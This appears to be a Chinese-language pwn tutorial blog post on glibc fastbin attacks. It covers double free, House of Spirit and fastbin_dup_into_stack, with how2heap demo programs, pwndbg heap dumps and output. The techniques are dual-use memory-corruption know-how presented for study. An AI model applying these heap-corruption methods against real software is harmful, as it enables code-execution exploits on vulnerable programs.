---
layout: post
title:  "Fastbin Attack"
date:   2019-7-15
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

# Fastbin Attack

![11](https://raw.githubusercontent.com/AiDaiP/images/master/pwn/11.png)

- ##### 条件

  1. 存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞
  2. 漏洞发生于 fastbin 类型的 chunk 中

- ##### 原理

  ```c
  int main(void)
  {
      void *chunk1,*chunk2,*chunk3;
      chunk1=malloc(0x30);
      chunk2=malloc(0x30);
      chunk3=malloc(0x30);
      free(chunk1);
      free(chunk2);
      free(chunk3);
      printf("gg");
      return 0;
  }
  ```

  free前

  ```c
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000041 <=== chunk1
  0x8402260:      0x0000000000000000      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000000
  0x8402280:      0x0000000000000000      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000000041 <=== chunk2
  0x84022a0:      0x0000000000000000      0x0000000000000000
  0x84022b0:      0x0000000000000000      0x0000000000000000
  0x84022c0:      0x0000000000000000      0x0000000000000000
  0x84022d0:      0x0000000000000000      0x0000000000000041 <=== chunk3
  0x84022e0:      0x0000000000000000      0x0000000000000000
  0x84022f0:      0x0000000000000000      0x0000000000000000
  0x8402300:      0x0000000000000000      0x0000000000000000
  0x8402310:      0x0000000000000000      0x0000000000020cf1 <=== top chunk
  ```

  free后

  ```c
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000041 <=== chunk1
  0x8402260:      0x0000000000000000      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000000
  0x8402280:      0x0000000000000000      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000000041 <=== chunk2
  0x84022a0:      0x0000000008402260      0x0000000000000000
  0x84022b0:      0x0000000000000000      0x0000000000000000
  0x84022c0:      0x0000000000000000      0x0000000000000000
  0x84022d0:      0x0000000000000000      0x0000000000000041 <=== chunk3
  0x84022e0:      0x00000000084022a0      0x0000000000000000
  0x84022f0:      0x0000000000000000      0x0000000000000000
  0x8402300:      0x0000000000000000      0x0000000000000000
  0x8402310:      0x0000000000000000      0x0000000000020cf1 <=== top chunk
  
  chunk3 ==> chunk2 ==> chunk1
  ```

  

- ##### Fastbin Double Free

  * 产生原因
    1. fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空
    2. fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。

  ```c
  int main(void)
  {
      void *chunk1,*chunk2;
      chunk1=malloc(0x10);
      chunk2=malloc(0x10);
      free(chunk1);
      free(chunk1);
      printf("gg");
      return 0;
  }
  ```

  free前

  ```c
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000021 <=== chunk1
  0x8402260:      0x0000000000000000      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000021 <=== chunk2
  0x8402280:      0x0000000000000000      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000020d71 <=== top chunk
  ```

  free后

  ```c
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000021 <=== chunk1
  0x8402260:      0x0000000008402260      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000021 <=== chunk2
  0x8402280:      0x0000000000000000      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000020d71 <=== top chunk
  
  chunk1 —▸ chunk1
  ```

  

  ```c
  int main(void)
  {
      void *chunk1,*chunk2;
      chunk1=malloc(0x10);
      chunk2=malloc(0x10);
      free(chunk1);
      free(chunk2);
      free(chunk1);
      printf("gg");
      return 0;
  }
  ```

  free前

  ```c
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000021 <=== chunk1
  0x8402260:      0x0000000000000000      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000021 <=== chunk2
  0x8402280:      0x0000000000000000      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000020d71 <=== top chunk
  ```

  free

  ```c
  第一次free
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000021 <=== chunk1
  0x8402260:      0x0000000000000000      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000021 <=== chunk2
  0x8402280:      0x0000000000000000      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000020d71 <=== top chunk
  
  第二次free
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000021 <=== chunk1
  0x8402260:      0x0000000000000000      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000021 <=== chunk2
  0x8402280:      0x0000000008402260      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000020d71 <=== top chunk
  
  第三次free
  pwndbg> x/64gx 0x8402250
  0x8402250:      0x0000000000000000      0x0000000000000021 <=== chunk1
  0x8402260:      0x0000000008402280      0x0000000000000000
  0x8402270:      0x0000000000000000      0x0000000000000021 <=== chunk2
  0x8402280:      0x0000000008402260      0x0000000000000000
  0x8402290:      0x0000000000000000      0x0000000000020d71 <=== top chunk
  
  chunk1 ==> chunk2 ==> chunk1
  ```

- #### House Of Spirit

  在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的


  * ##### 绕过检测

    1. fake chunk 的 ISMMAP 位不能为 1
    2. fake chunk 地址需要对齐 
    3. fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
    4. fake chunk 的 next chunk 的大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem`。
    5. fake chunk 对应的 fastbin 链表头部不能是该 fake chunk。

  * ##### how2heap house_of_spirit

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
    	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");
    
    	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    	malloc(1);
    	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
    	unsigned long long *a;
    	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
    	puts("gg");
    	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
    
    	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    	fake_chunks[1] = 0x40; // this is the size
    
    	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
            // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    	fake_chunks[9] = 0x1234; // nextsize
    	puts("gg");
    	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
    	a = &fake_chunks[2];
    
    	fprintf(stderr, "Freeing the overwritten pointer.\n");
    	free(a);
    	puts("gg");
    	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
    }
    
    ```

    ```c
    fake_chunks
    pwndbg> x/64gx 0x7ffffffee480
    0x7ffffffee480: 0x0000000000000009      0x0000000000000040
    0x7ffffffee490: 0x0000000000000000      0x0000000000f0b5ff
    0x7ffffffee4a0: 0x0000000000000001      0x0000000008000abd
    0x7ffffffee4b0: 0x00007fffff4109a0      0x0000000000000000
    0x7ffffffee4c0: 0x0000000008000a70      0x0000000000001234
    free后
    pwndbg> bins
    tcachebins
    0x40 [  1]: 0x7ffffffee490 ◂— 0x0
    ```

    ```c
    This file demonstrates the house of spirit attack.
    Calling malloc() once so that it sets up its memory.
    We will now overwrite a pointer to point to a fake 'fastbin' region.
    This region (memory of length: 80) contains two chunks. The first starts at 0x7ffffffee488 and
    the second at 0x7ffffffee4c8.
    This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
    ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
    The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks.
    No need for fastbin size.
    Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffffffee488.
    ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
    Freeing the overwritten pointer.
    Now the next malloc will return the region of our fake chunk at 0x7ffffffee488, which will be 0x7ffffffee490!
    malloc(0x30): 0x7ffffffee490
    ```

    

- #### Alloc to Stack

  把 fd 指针指向想要分配的栈上，从而实现控制栈中的一些关键数据 

  * ##### how2heap fastbin_dup_into_stack

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
    	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
    	       "returning a pointer to a controlled location (in this case, the stack).\n");
    
    	unsigned long long stack_var;
    
    	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
    
    	fprintf(stderr, "Allocating 3 buffers.\n");
    	int *a = malloc(8);
    	int *b = malloc(8);
    	int *c = malloc(8);
    
    	fprintf(stderr, "1st malloc(8): %p\n", a);
    	fprintf(stderr, "2nd malloc(8): %p\n", b);
    	fprintf(stderr, "3rd malloc(8): %p\n", c);
    
    	fprintf(stderr, "Freeing the first one...\n");
    	free(a);
    
    	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    	// free(a);
    
    	fprintf(stderr, "So, instead, we'll free %p.\n", b);
    	free(b);
    
    	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    	free(a);
    	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
    		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    	unsigned long long *d = malloc(8);
    
    	fprintf(stderr, "1st malloc(8): %p\n", d);
    	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
    	fprintf(stderr, "Now the free list has [ %p ].\n", a);
    	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
    		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
    		"so that malloc will think there is a free chunk there and agree to\n"
    		"return a pointer to it.\n", a);
    	stack_var = 0x20;
    
    	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    	puts("gg");
    	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
    	puts("gg");
    	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    	puts("gg");
    	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
    	puts("gg");
    }
    
    ```

    第一个gg

    ```c
    pwndbg> x/64gx 0x8403250
    0x8403250:      0x0000000000000000      0x0000000000000021
    0x8403260:      0x0000000008403280      0x0000000000000000
    0x8403270:      0x0000000000000000      0x0000000000000021
    0x8403280:      0x0000000008403260      0x0000000000000000
    0x8403290:      0x0000000000000000      0x0000000000000021
    0x84032a0:      0x0000000000000000      0x0000000000000000
    0x84032b0:      0x0000000000000000      0x0000000000020d51
    
    pwndbg> stack
    00:0000│ rsp  0x7ffffffee4a8 —▸ 0x8000aba (main+672) ◂— lea    rax, [rbp - 0x30] /* 0x8e88348d0458d48 */
    01:0008│      0x7ffffffee4b0 ◂— 0x20 /* ' ' */
    02:0010│      0x7ffffffee4b8 —▸ 0x8403260 —▸ 0x8403280 ◂— 0x8403260
    03:0018│      0x7ffffffee4c0 —▸ 0x8403280 —▸ 0x8403260 ◂— 0x8403280
    04:0020│      0x7ffffffee4c8 —▸ 0x84032a0 ◂— 0x0
    05:0028│      0x7ffffffee4d0 —▸ 0x8403260 —▸ 0x8403280 ◂— 0x8403260
    06:0030│      0x7ffffffee4d8 ◂— 0x28a5f2ef36aa0600
    07:0038│ rbp  0x7ffffffee4e0 —▸ 0x8000b60 (__libc_csu_init) ◂— push   r15 /* 0x41d7894956415741 */
    ```

    第二个gg

    ```c
    pwndbg> x/64gx 0x8403250
    0x8403250:      0x0000000000000000      0x0000000000000021
    0x8403260:      0x00007ffffffee4a8      0x0000000000000000
    0x8403270:      0x0000000000000000      0x0000000000000021
    0x8403280:      0x0000000008403260      0x0000000000000000
    0x8403290:      0x0000000000000000      0x0000000000000021
    0x84032a0:      0x0000000000000000      0x0000000000000000
    0x84032b0:      0x0000000000000000      0x0000000000001011
    
    pwndbg> bins
    tcachebins
    0x20 [  0]: 0x7ffffffee4a8 —▸ 0x8000b0c (main+754) ◂— mov    edi, 8 /* 0xfbcae800000008bf */
    ```

    第三个gg

    ```
    pwndbg> x/64gx 0x8403250
    0x8403250:      0x0000000000000000      0x0000000000000021
    0x8403260:      0x00007ffffffee4a8      0x0000000000000000
    0x8403270:      0x0000000000000000      0x0000000000000021
    0x8403280:      0x0000000008403260      0x0000000000000000
    0x8403290:      0x0000000000000000      0x0000000000000021
    0x84032a0:      0x0000000000000000      0x0000000000000000
    0x84032b0:      0x0000000000000000      0x0000000000001011
    
    pwndbg> bins
    tcachebins
    0x20 [ -1]: 0x8000b16 (main+764) ◂— mov    rdx, rax /* 0x1500058b48c28948 */
    ```

    

    ```
    This file extends on fastbin_dup.c by tricking malloc into
    returning a pointer to a controlled location (in this case, the stack).
    The address we want malloc() to return is 0x7ffffffee4b8.
    Allocating 3 buffers.
    1st malloc(8): 0x8403260
    2nd malloc(8): 0x8403280
    3rd malloc(8): 0x84032a0
    Freeing the first one...
    If we free 0x8403260 again, things will crash because 0x8403260 is at the top of the free list.
    So, instead, we'll free 0x8403280.
    Now, we can free 0x8403260 again, since it's not the head of the free list.
    Now the free list has [ 0x8403260, 0x8403280, 0x8403260 ]. We'll now carry out our attack by modifying data at 0x8403260.
    1st malloc(8): 0x8403260
    2nd malloc(8): 0x8403280
    Now the free list has [ 0x8403260 ].
    Now, we have access to 0x8403260 while it remains at the head of the free list.
    so now we are writing a fake free size (in this case, 0x20) to the stack,
    so that malloc will think there is a free chunk there and agree to
    return a pointer to it.
    Now, we overwrite the first 8 bytes of the data at 0x8403260 to point right before the 0x20.
    3rd malloc(8): 0x8403260, putting the stack address on the free list
    4th malloc(8): 0x7ffffffee4a8
    ```

    

- #### Arbitrary Alloc

  把 chunk 分配到任意存在合法的 size 域的可写内存中 

  
